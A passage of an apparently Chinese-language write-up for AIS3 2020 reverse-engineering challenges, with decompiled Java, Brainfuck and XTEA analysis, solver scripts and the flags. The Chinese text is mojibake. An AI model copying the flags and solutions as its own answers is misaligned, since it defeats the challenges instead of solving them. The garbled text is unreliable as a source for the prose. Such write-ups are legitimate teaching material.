[&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;_&#x27;,&#x27;W&#x27;,&#x27;X&#x27;,&#x27;Y&#x27;,&#x27;0&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;S&#x27;,&#x27;T&#x27;,&#x27;U&#x27;,&#x27;V&#x27;,&#x27;G&#x27;,&#x27;H&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;K&#x27;,&#x27;L&#x27;,&#x27;M&#x27;,&#x27;N&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;l&#x27;,&#x27;O&#x27;,&#x27;P&#x27;,&#x27;Q&#x27;,&#x27;R&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;]f = open(&quot;./TsaiBroSaid&quot;,&quot;r&quot;).read().split(&#x27;\\n&#x27;)[1]f = f.split(&quot;ç™¼è²¡&quot;)[1:]for i in range(0,len(f),2): print(table[(len(f[i])-1)*8+len(f[i+1])-1],end=&#x27;&#x27;) Flag: AIS3&#123;y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3&#125; åæ§½ä¸€ä¸‹ more long æ˜¯ä»€éº¼çˆ›è‹±æ–‡ ğŸ¹ Fallen Beaté¡Œç›®æ•˜è¿° CTF player,æˆ‘è¦æŒ‘æˆ°ä½ , Iâ€™m gonna challenge you!!ZRé€™æ˜¯æˆ‘çš„å®¤å‹å…¼ lab åŒå­¸,ä»–å·²ç¶“è€ƒéé‡‘æ¡†æš´é¾å¤©ï¼Œä»–æ˜¯å€‹æ—‹éˆ•äºº,ä¸åƒä½ æ˜¯å€‹æ•²éµç›¤çš„,æ‰€ä»¥æˆ‘è¦æ¸¬æ¸¬ä½ çš„ç¨‹åº¦åˆ°å“ªè£¡,å°±ç”¨ ZR çš„å¤§ä¸€ project ä¾†æ±ºå‹è² å§ï¼ï¼å¾—åˆ° Full Combo ä¾†è®“æˆ‘åˆ®ç›®ç›¸çœ‹ï¼ï¼ ä¾†è‡ªå®¤å‹å¤§ä¸€çš„ final projectï¼ŒéŸ³æ¨‚éŸ³é‡æ²’æœ‰ normalize å°è‡´æˆ‘å·²ç¶“è€³è¾ï¼Œé¡Œç›®èªªåªè¦ full combo å°±æœƒçµ¦ä½  flagï¼Œé¿å…æœ‰äººå¦„æƒ³ç”¨ç©çš„ï¼Œæ‰€ä»¥è·Ÿæ™®é€šéŸ³éŠè¦å‰‡ä¸åŒï¼Œèª¿æ•´æˆåªæœ‰ perfect æ‰æœƒ comboï¼Œå¦‚æœä½ é‚„ç©å‡ºä¾†äº†ï¼Œéº»ç…©ä¸‹é¢ç•™è¨€ï¼Œæˆ‘è¦è·ªä½ ã€‚ é¡Œè§£java æ˜¯ç›´è­¯å¼èªè¨€ï¼Œ compile åªæ˜¯ compile æˆ Java bytecodeï¼Œå¹¾ä¹æ‰€æœ‰çš„æ±è¥¿éƒ½é‚„ç•™è‘—ï¼ŒåŒ…æ‹¬è®Šæ•¸åç¨±ï¼Œdecompile å¾Œå¯ä»¥æ‹¿åˆ°å¹¾ä¹è·ŸåŸå§‹ç¢¼ä¸€æ¨£çš„ java codeï¼Œç›´æ¥ç”¨ç·šä¸Šå·¥å…·ä¾† decompileï¼Œé€™é¡Œé›£çš„åœ°æ–¹å¤§æ¦‚åªæœ‰ code æ»¿å¤šçš„ï¼Œå¯ä»¥ç›´æ¥æ‰¾ä¸€ä¸‹è®Šæ•¸åç¨±æœ‰æ²’æœ‰ flagï¼š åœ¨ Visual/PanelEnding.java 79 è¡Œé™„è¿‘å¯ä»¥æ‰¾åˆ°ä¸€å€‹è®Šæ•¸å«åš flag ï¼Œå…§å®¹çœ‹èµ·ä¾†åƒæ˜¯è¢«åŠ å¯†éã€‚ Visual/PanelEnding.java798081828384this.lWest = new JLabel();this.lEast = new JLabel();this.flag = new byte[] &#123; 89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73, 110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, 127, 124, 94, 103, 46, 107, 97, 104 &#125;; this.btnFont = new Font(&quot;Dialog&quot;, 1, 35);this.btnBack = new JButton(&quot;Back&quot;);this.setLayout(new BorderLayout());this.setBackground(this.c.brown); ç¹¼çºŒå¾€ä¸‹çœ‹ï¼Œåœ¨ setValue ä¸­çœ‹å¾—å‡ºä¾†ç•¶ t == mc çš„æ™‚å€™ï¼Œcache æœƒæ‹¿ä¾†è·Ÿ flag decrypt ç„¶å¾Œå°å‡ºä¾†ï¼š Visual/PanelEnding.java173174175176177178179180181if (t == mc) &#123; for (int i = 0; i &lt; cache.size(); ++i) &#123; final byte[] flag = this.flag; final int n = i % this.flag.length; flag[n] ^= (byte)(Object)cache.get(i); &#125; final String fff = new String(this.flag); this.text[0].setText(String.format(&quot;Flag: %s&quot;, fff));&#125; ç„¶å¾Œè¿½ä¸€ä¸‹ tã€mcã€cache åˆ†åˆ¥æ˜¯ä»€éº¼ï¼Œåœ¨ Control/GameControl.java ä¸­å¯ä»¥æ‰¾åˆ° t å°±æ˜¯é€™å€‹è­œé¢ç¸½å…±æœ‰å¤šå°‘çš„éŸ³ç¬¦ï¼Œ mc å°±æ˜¯éŠæˆ²çµæŸæ™‚çš„ combo æ•¸ï¼š Control/GameControl.java291this.pe.setValue(this.total, this.critical, this.early, this.late, this.miss, this.comboMax, this.info, this.cache); ç¹¼çºŒå¾€ä¸‹è¿½å¯ä»¥æ‰¾åˆ° cache å…¶å¯¦å°±æ˜¯è®€é€²ä¾†çš„è­œé¢æª”æ¡ˆ Control/GameControl.java143144145146147148149150151152153154155156157158159160161162163while (br.ready()) &#123; final String s = br.readLine(); if (s.charAt(0) != &#x27;*&#x27;) &#123; final int a = Integer.parseInt(s); this.cache.add(a); for (int k = 0; k &lt; 5; ++k) &#123; if ((a &gt;&gt; k &amp; 0x1) == 0x1) &#123; if (k != 4) &#123; (this.note = new JLabel(this.bt)).setBounds(bounds[k], this.y, 100, 40); &#125; else &#123; (this.note = new JLabel(this.fx)).setBounds(bounds[k], this.y, 350, 40); &#125; this.pFumen.add(this.note); this.check.get(k).add(this.y); ++this.total; &#125; &#125; this.y += this.distance; &#125;&#125; çœ‹åˆ°é€™è£¡åŸºæœ¬ä¸Šå¯ä»¥æƒ³åˆ°å¹¾å€‹è§£æ³•ï¼š æ”¹ if(t == mc) çš„ bytecode è®“ä»–ç›´æ¥é€šé æ‰¾åˆ° cacheï¼Œæ¨¡ä»¿ code è‡ªå·± decrypt æ”¹ source code ç„¶å¾Œé‡æ–°ç·¨è­¯ éŠæˆ²ä¿®æ”¹å™¨ â€¦ å› ç‚ºæ²’åšä»€éº¼å¥‡æ€ªçš„äº‹æƒ…ï¼Œæ‰€ä»¥ä¸Šé¢çš„è§£æ³•æ‡‰è©²éƒ½æ˜¯åšå¾—åˆ°çš„ï¼Œä¸éé‚„æ˜¯æœ€æ¨è–¦ç¬¬äºŒå€‹åšæ³•ï¼Œå› ç‚ºæˆ‘ Mac ä¹Ÿæœƒè·‘ç‰ˆï¼Œæ‰€ä»¥é‚„æ˜¯å¯«è…³æœ¬è§£å¯¦åœ¨ï¼Œç•¶ç„¶ä½ è¦ç›´æ¥æŠ½ code å‡ºä¾†å¯«ä¸€å€‹ java ä¹Ÿè¡Œï¼š solve.py#!/usr/bin/env python3flag = [89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73, 110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, 127, 124, 94, 103, 46, 107, 97, 104]with open(&#x27;AIS3_2020_pre/Fallen_Beat/songs/gekkou/hell.txt&#x27;) as f: lines = filter(lambda l: &#x27;*&#x27; not in l, f.readlines()[1:])for idx,line in enumerate(lines): flag[idx%len(flag)] ^= int(line)print(bytes(flag)) Flag: AIS3&#123;Wow_how_m4ny_h4nds_do_you_h4ve&#125; ğŸ§  Stand up!Brainé¡Œç›®æ•˜è¿° åˆåˆ°äº† Brain tell å’ª ã„œ joke çš„æ™‚é–“äº†é€™æ¬¡è¼ªåˆ°ä½ èªªå€‹ç¬‘è©±ä¾†è½è½äº† é¡Œè§£é¡Œç›®çµ¦çš„æ˜¯ä¸€å€‹ç”¨ ï¼£ å¯«çš„ Brainfuck interpreterï¼Œè€æ¢—ï¼Œä½†ä¸çŸ¥é“ä¹Ÿæ²’é—œä¿‚ï¼Œé‚„æ˜¯å¯ä»¥é€éé€†å‘çœ‹æ‡‚ã€‚ é€™è£¡ç”¨ radare2 disassembleï¼Œ0x7e2 é€™è£¡å¯ä»¥çœ‹åˆ°è¼¸å…¥æ˜¯ 6 å€‹å­—ï¼Œæ¨æ¸¬è¼¸å…¥æ­£ç¢ºçš„ 6 å€‹å­—å°±æœƒæ‹¿åˆ° flagï¼š scanflea rax, [var_eh]mov rsi, rax; const char *format; &quot;%6s&quot;lea rdi, [0x00000a84]mov eax, 0; int scanf(const char *format)call sym.imp.__isoc99_scanf;[oc]mov dword [var_24h], 0jmp 0x853 å¯ä»¥å˜—è©¦æš´æœæ­£ç¢ºçš„ 6 å€‹å­—æ˜¯ä»€éº¼ï¼Œä½†æ»¿ä¹…çš„ï¼Œç¹¼çºŒå¾€ä¸‹çœ‹ï¼Œ0x853 è·Ÿ 0x81c é€™è£¡æ˜¯ä¸€å€‹ for è¿´åœˆï¼Œæ¯å€‹è¿´åœˆåšçš„äº‹æƒ…æ˜¯æŠŠ input æ‹¿å‡ºä¾†æ”¾åˆ° 0x00201380 çš„ array ä¸Šä¸¦ä¸”å†è£œä¸Šä¸€å€‹å…ƒç´  1ï¼Œæ‰€ä»¥ array 0x00201380 æœ€å¾Œæœƒè®Šæˆ [input[0], 1, input[1], 1, input[2], 1, input[3], 1, input[4], 1, input[5], 1]ï¼š for_loop[0x81c]CODE XREF from main @ 0x857mov eax, dword [var_24h]lea edx, [rax + rax]mov eax, dword [var_24h]cdqemovzx ecx, byte [rbp + rax - 0xe] ; get char at input[ecx]movsxd rdx, edxlea rax, [0x00201380]mov byte [rdx + rax], clmov eax, dword [var_24h]add eax, eaxadd eax, 1movsxd rdx, eaxlea rax, [0x00201380]mov byte [rdx + rax], 1add dword [var_24h], 1 å†å¾€ä¸‹çœ‹ï¼Œæœƒçœ‹åˆ°å¼•ç”¨ä¸€ä¸² dataï¼Œé€™ä¸€ä¸²å°±æ˜¯ Brainfuck ç¨‹å¼ç¢¼ï¼š -------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]]]]]]] å¦‚æœä¸çŸ¥é“ Brainfuck é‚„æ˜¯èƒ½é€éé€†å‘çŸ¥é“é€™å€‹èªè¨€çš„å¤§æ¦‚ï¼Œç¨‹å¼åœ¨ 0x986 çš„åœ°æ–¹é€²å…¥ä¸€å€‹å¾ˆå¤§çš„ for loopï¼Œ0x869 é€™è£é–‹å§‹æ˜¯ switch çš„ç¯„åœæª¢æŸ¥ï¼Œç„¶å¾Œå¾€ä¸‹ä¸€é» 0x87f é€™è£¡æ˜¯ switch æ±ºå®šå»å“ªå€‹ caseï¼Œé€™è£¡çš„ radare2 ä¸‹çš„è¨»è§£æ˜¯éŒ¯çš„ï¼Œå› ç‚ºæœ€å°çš„ case +(0x2b) åˆ°æœ€å¤§çš„ case ](0x5d) é–‰å€é–“é•·åº¦æ˜¯ 51ï¼Œä½†å…¶å¯¦åªæœ‰ 7 å€‹ caseï¼š switch0x87f [oi]mov eax, eaxlea rdx, [rax*4]lea rax, [0x00000a9c]mov eax, dword [rdx + rax]movsxd rdx, eaxlea rax, [0x00000a9c]add rax, rdx; switch table (51 cases) at 0xa9c;-- switchjmp rax é€™å¹¾å€‹ case æ˜¯ +ã€-ã€&lt;ã€&gt;ã€[ã€]ã€.ï¼Œçœ‹ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“æ¯å€‹ç¬¦è™Ÿçš„æ„ç¾©äº†ï¼Œæ‰“ä¸‹å»å¤ªå¤šï¼Œç•¥ä¸€æ³¢wikiã€‚æ‰€ä»¥ç¾åœ¨å¯ä»¥å›é ­çœ‹é‚£ä¸€ä¸² Brainfuck åœ¨å¹¹å˜›äº†ï¼ŒåŸºæœ¬ä¸Š -------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[..ç•¥..] å…¶å¯¦å°±æ˜¯ if ï¼Œæ‰€ä»¥å…¨éƒ¨çš„ code å°±æ˜¯å·¢ç‹€çš„ ifï¼Œæ‹¿å€‹ç°¡ç•¥çš„ç‹€æ³èªªæ˜ï¼Œä¸‹é¢é€™æ®µ code çš„é‚è¼¯æ˜¯ if(var0==1)&#123;..ç•¥..&#125;ï¼š # å‡è¨­è¨˜æ†¶é«”é•·é€™æ¨£ memory[4,1]--[&gt;[-]&lt;[-]]&gt;[..ç•¥..] ä¸€é–‹å§‹ -- æœƒæŠŠè¨˜æ†¶é«”ä¸Šçš„ memory[0] æ‰£ 2 è®Šæˆ 2ï¼ŒåŸ·è¡Œåˆ°[æ™‚å¦‚æœç•¶å‰æŒ‡æ¨™æŒ‡åˆ°çš„è¨˜æ†¶é«”ä½ç½®ä¸æ˜¯0å°±æœƒé€²å…¥[&gt;[-]&lt;[-]]ï¼Œ[&gt;[-]&lt;[-]]åšçš„äº‹æƒ…æ˜¯æŠŠä¸‹ä¸€å€‹ä½ç½®ï¼ˆmemory[1]ï¼‰æ‰£æˆ 0 ç„¶å¾Œå†æŠŠæŒ‡æ¨™ç§»å›ä¾†memory[0]ï¼Œæ¸…ç©º memory[0]ï¼Œæ‰€ä»¥ç•¶åŸ·è¡Œåˆ° &gt;[...ç•¥...] æ™‚ï¼Œç¬¬ä¸€å€‹&gt;ç§»å‹•æŒ‡æ¨™åˆ°memory[1]ï¼Œæ˜¯ 0å°±ä¸æœƒå»åŸ·è¡Œ [...ç•¥...]ï¼Œé‚£å¦‚æœé‡æ–°ä¾†éï¼Œè¨˜æ†¶é«”ä¸Šçš„ 4 ä¸€é–‹å§‹æ˜¯ 2 çš„è©±ï¼š # å‡è¨­è¨˜æ†¶é«”é•·é€™æ¨£ memory[2,1]--[&gt;[-]&lt;[-]]&gt;[..ç•¥..] ä¸€é–‹å§‹ -- æœƒæŠŠè¨˜æ†¶é«”ä¸Šçš„ memory[0] æ‰£ 2 è®Šæˆ 0ï¼ŒåŸ·è¡Œåˆ°[æ™‚å› ç‚ºç¾åœ¨æŒ‡å‘çš„è¨˜æ†¶é«”æ•¸å€¼æ˜¯ 0 æ‰€ä»¥ä¸æœƒé€²å…¥[&gt;[-]&lt;[-]]ï¼Œè·³åˆ°å¾Œé¢åŸ·è¡Œ&gt;[...ç•¥...]ï¼Œç¬¬ä¸€å€‹&gt;ç§»å‹•æŒ‡æ¨™åˆ°memory[1]ï¼Œæ˜¯ 1ï¼Œå°±æœƒåŸ·è¡Œ[...ç•¥...]ã€‚ åˆ°é€™è£¡å°±å¾ˆæ¸…æ¥šäº†ï¼Œè¼¸å…¥çš„ ascii code è¦ç­‰æ–¼å‰é¢æœ‰å¹¾å€‹-ï¼Œé€™æ¨£æ‰æœƒé€šéåˆ¤å®šï¼Œå¯ä»¥çŸ¥é“æ­£ç¢ºçš„è¼¸å…¥æ˜¯[67, 56, 55, 54, 51, 33]å°±æ˜¯C8763!ï¼ŒæŠŠé‚è¼¯æ›æˆ C æœƒåƒæ˜¯é€™æ¨£ï¼š pseudo_code12345678910111213if(input[0] == &#x27;C&#x27;)&#123; if(input[1] == &#x27;8&#x27;)&#123; if(input[2] == &#x27;7&#x27;)&#123; if(input[3] == &#x27;6&#x27;)&#123; if(input[4] = &#x27;3&#x27;)&#123; if(input[5] = &#x27;!&#x27;)&#123; print flag &#125; &#125; &#125; &#125; &#125;&#125; ç•¶ç„¶ä¹Ÿå¯ä»¥ç›´æ¥è·³éæ‰€æœ‰çš„ifï¼ŒåªåŸ·è¡Œæœ€å¾Œå° flag çš„ code å°±å¥½äº†ï¼Œå¯ä»¥ç”¨ç·šä¸Šå·¥å…·ã€‚ print_flag&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++. Flag: AIS3&#123;Th1s_1s_br4iNFUCK_bu7_m0r3_ez&#125; ğŸ¹ Long Island Iced Teaé¡Œç›®æ•˜è¿° é•·Â·å³¶Â·å†°Â·èŒ¶æˆ‘Â·çš„Â·æœ€Â·æ„›é•·Â·å³¶Â·å†°Â·èŒ¶è¶…Â·çˆ½Â·å£Â·æ„Ÿå’šå’šå’šã„ã„§ã„¤å’šå’šå’šã„ã„§ã„¤å’šå’šå’šã„ã„§ã„¤æˆ‘çœŸçš„å¥½ã„ã„§ã„¤ é™„é€™å€‹é€£çµå®³æˆ‘å¯«é€™ç¯‡çš„æ™‚å€™ä¸€ç›´é‡æ’­ é¡Œè§£é€™è£¡å°±ç”¨ decompile ä¹‹å¾Œçš„ code ä¾†è¬›è§£ï¼Œæ²’æœ‰ IDA å¯ä»¥ç”¨ Ghidraï¼Œç§‘æ™®ä¸€ä¸‹ï¼ŒGhidra å”¸ä½œGee-druhï¼Œæˆ–æ˜¯ä½ å¯ä»¥å­¸æˆ‘å¿µ Costcoã€‚ åŸºæœ¬ä¸Š main åšçš„äº‹æƒ…å°±æ˜¯ Zero padding main123456789101112131415161718puts(&quot;My encryptor 0.1&quot;);puts(&quot;I didn&#x27;t implement the decryptor&quot;);puts(&quot;So,you&#x27;ll never find out my secret unless I am drunk&quot;);__isoc99_scanf(&quot;%ms&quot;, &amp;s);v7 = strlen(s);//v8 ç®—å‡ºæ¯”ç›®å‰è¼¸å…¥é•·åº¦å¤§çš„ 8 çš„å€æ•¸ï¼Œä¾‹å¦‚ 7 æœƒå¾—åˆ° 8ï¼Œ17 å¾—åˆ° 24v8 = 8 * (v7 / 8 + 1);//é‡æ–°åˆ†é…ä¸€å€‹å¤§å°ï¼Œè€Œä¸”è¤‡è£½æœ¬ä¾†çš„è¼¸å…¥ä¸Šå»s = (char *)realloc(s, v8 + 1);//å¤šå‡ºä¾†çš„éƒ¨åˆ†éƒ½æ”¾ 0ï¼Œå…¶å¯¦å°±æ˜¯åœ¨åš 0 paddingfor ( i = v8; i &gt;= v7; --i ) s[i] = 0;qmemcpy(v10, &quot;dloGtroBedaJybuR&quot;, 16);for ( j = 0; j &lt; v8 / 8 + 1; ++j ) sub_83A(s, v10);for ( k = 0; k &lt; v8; ++k ) printf(&quot;%02hhx&quot;, (unsigned int)s[k]);free(s); æ²’ä»€éº¼ç‰¹åˆ¥çš„ï¼Œå¯ä»¥ç¹¼çºŒå¾€ä¸‹çœ‹ï¼š sub_83A12345678910111213141516171819202122__int64 __fastcall sub_83A(unsigned int *a1, __int64 a2)&#123; __int64 result; // rax unsigned int i; // [rsp+1Ch] [rbp-14h] unsigned int v4; // [rsp+20h] [rbp-10h] unsigned int v5; // [rsp+24h] [rbp-Ch] unsigned int v6; // [rsp+28h] [rbp-8h] v4 = *a1; v5 = a1[1]; v6 = 0; for ( i = 0; i &lt;= 0x3F; ++i ) &#123; v4 += (((v5 &gt;&gt; 5) ^ (16 * v5)) + v5) ^ (*(_DWORD *)(4LL * (v6 &amp; 3) + a2) + v6); v6 -= 0x61C88647; v5 += (((v4 &gt;&gt; 5) ^ (16 * v4)) + v4) ^ (*(_DWORD *)(4LL * ((v6 &gt;&gt; 11) &amp; 3) + a2) + v6); &#125; *a1 = v4; result = v5; a1[1] = v5; return result;&#125; çœ‹èµ·ä¾†æ˜¯æŸç¨®åŠ å¯†æˆ–æ˜¯ hash ç®—æ³•ï¼Œå¦‚æœå¤ æ•æ„Ÿçš„è©±æ‡‰è©²æœƒæ³¨æ„åˆ°é€™å€‹ç®—æ³•è£¡é¢æœ‰ magic number å­˜åœ¨ï¼Œ0x61C88647ï¼Œä½†è¦æ³¨æ„ï¼Œé€™æ˜¯ IDA ç…§ variable type ä¿®æ­£ç”¢å‡ºçš„ pseudo codeï¼Œå›å»çœ‹ assemblyï¼Œæœƒç™¼ç¾å…¶å¯¦æ˜¯ï¼š mov [rbp+var_4], 9E3779B9h æœ¬ä¾†æ˜¯ v6 += 0x9E3779B9ï¼Œä½† IDA è¦ºå¾— v6 -= 0x61C88647 æ¯”è¼ƒå¥½ï¼Œç¸½ä¹‹åªæ˜¯ 2â€™s complementï¼Œå…¶å¯¦ä¸ç®¡å“ªä¸€å€‹éƒ½å¯ä»¥æ‰¾é—œéµç®—æ³• TEAï¼Œä»”ç´°çœ‹ä¸€ä¸‹æœƒç™¼ç¾å…¶å¯¦æœ‰é»ä¸å¤ªä¸€æ¨£ï¼Œä½†æ‡‰è©²è¶³å¤ æ¨¡ä»¿å¯«å‡º decrypt çš„ç¨‹å¼äº†ï¼Œå°±åè½‰æ“ä½œè€Œå·²ï¼Œå¦‚æœæœ‰è€å¿ƒçˆ¬ä¸€ä¸‹ wiki æœƒç™¼ç¾é¡Œç›®å¯¦ä½œçš„ç®—æ³•æ˜¯ XTEAï¼Œç›´æ¥ç”¨ wiki ä¸Šçš„ decrypt å°±è¡Œäº†ï¼Œè¦æ³¨æ„çš„æ˜¯ main è£¡é¢å…¶å¯¦åªæœ‰åŠ å¯†ç¬¬ä¸€å¡Š blockï¼Œæ‰€ä»¥ç¬¬ä¸€å¡Šè¢«åŠ å¯†äº† 9 æ¬¡ï¼Œåªè¦è§£å¯†ç¬¬ä¸€å¡Šå°±å¥½äº†ï¼š main1234567891011121314151617puts(&quot;My encryptor 0.1&quot;);puts(&quot;I didn&#x27;t implement the decryptor&quot;);puts(&quot;So,you&#x27;ll never find out my secret unless I am drunk&quot;);__isoc99_scanf(&quot;%ms&quot;, &amp;s);v7 = strlen(s);v8 = 8 * (v7 / 8 + 1);s = (char *)realloc(s, v8 + 1);for ( i = v8; i &gt;= v7; --i ) s[i] = 0;qmemcpy(v10, &quot;dloGtroBedaJybuR&quot;, 16);//---------------é€™è£¡æ°¸é åªåŠ å¯†ç¬¬ä¸€å¡Š block----------------for ( j = 0; j &lt; v8 / 8 + 1; ++j ) sub_83A(s, v10);//------------------------------------------------------for ( k = 0; k &lt; v8; ++k ) printf(&quot;%02hhx&quot;, (unsigned int)s[k]);free(s); å› ç‚ºåªæœ‰ç¬¬ä¸€å¡Šæœ‰åŠ å¯†ï¼š #My encryptor 0.1#I didn&#x27;t implement the decryptor#So,you&#x27;ll never find out my secret unless I am drunk#850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000In [1]: bytes.fromhex(&quot;850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000&quot;)Out[1]: b&#x27;\\x85\\n*M?\\xac\\x14\\x82irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27; æ‰€ä»¥é€™è£¡å°±æœ‰ç¬¬äºŒå€‹è§£æ³•æ˜¯çˆ†æœ 3 byte çš„æ–‡å­—(8 - len(&#39;AIS3&#123;&#39;))ï¼Œè³½ä¸­ @bronson113 è·Ÿæˆ‘èªªä»–æœ‰éé æœŸè§£ï¼Œåªè¦æš´æœ 2 byteï¼Œæˆ‘é‚„ä»¥ç‚ºåˆå¯«çˆ› code â€¦ï¼Œé›–ç„¶æ˜¯çœŸçš„ code å¯«çˆ›æ‰æ•¢æ”¾é€™é¡Œï¼Œä¸ç„¶å¥½åƒæœ‰é»å¤ªé›£ï¼Œä¸çŸ¥é“è¦æŸ¥ magic number çš„äººæ‡‰è©²è§£ä¸å‡ºä¾†ï¼Œæœ¬ä¾†æ˜¯æƒ³å‡ºé‚£ç¨®åŠ å¯†å¯«éŒ¯çš„æ²’éŒ¯ï¼Œä½†æ€éº¼å‡ºå¥½åƒéƒ½æœ‰é»å¤ªé›£ï¼Œä¹‹å¾Œæ‰çŸ¥é“åŸä¾†å¤§å®¶æš´æœéƒ½æœ‰çŒœå­— &#x3D; &#x3D;ï¼Œå¥½ï¼Œæ©ï¼Œç¸½ä¹‹ä½ çŒœåˆ°é‚£å€‹å­—æ˜¯ girl å°±å¯ä»¥åªæš´æœ 2 byteï¼Œè–çµçŸ³ä¿éšªèµ·è¦‹è²·ä¸‰ä»¶ï¼Œä¿éšªèµ·è¦‹æˆ‘éƒ½æœ 3 byteã€‚ bruteforce.py1234567891011from subprocess import *from string import *from itertools import producttarget = open(&quot;./flag&quot;,&#x27;rb&#x27;).read()for cipher in product(printable[:-5],repeat=3): plain = f&quot;AIS3&#123;&#123;&#123;&#x27;&#x27;.join(cipher)&#125;irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;&#125;&quot;.encode() p = check_output(&quot;./Long\\ Island\\ Iced\\ Tea&quot;,input=plain,shell=True) if p == target: print(plain) break ä¸éæœ€å¿«çš„è§£æ³•é‚„æ˜¯ç›´æ¥å¯« decryptï¼š decrypt.c12345678910111213141516171819202122232425#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;//copy from wikivoid decipher(uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*64; for (i=0; i &lt; 64; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0]=v0; v[1]=v1;&#125;int main()&#123; char key[] = &quot;dloGtroBedaJybuR&quot;; char input[] = &#123;0x85,0x0a,0x2a,0x4d,0x3f,0xac,0x14,0x82,0&#125;; for(int r = 0; r &lt; 9 ; r++)&#123; decipher(input,key); &#125; printf(&quot;%sirl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;&quot;,input);&#125; Flag: AIS3&#123;A!girl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125; è£œï¼šçœ‹å®Œ writeupï¼Œå¤§æ¦‚æ˜¯ä¸€åŠçš„äººç”¨æš´æœï¼Œä¸€åŠçš„äººæœ‰èªå‡ºä¾†æ˜¯ XTEAï¼Œå‡ºçš„ä¸éŒ¯ï¼Ÿæ‰“æ¯”è³½çš„æ™‚å€™æœ‰é‡é rc4 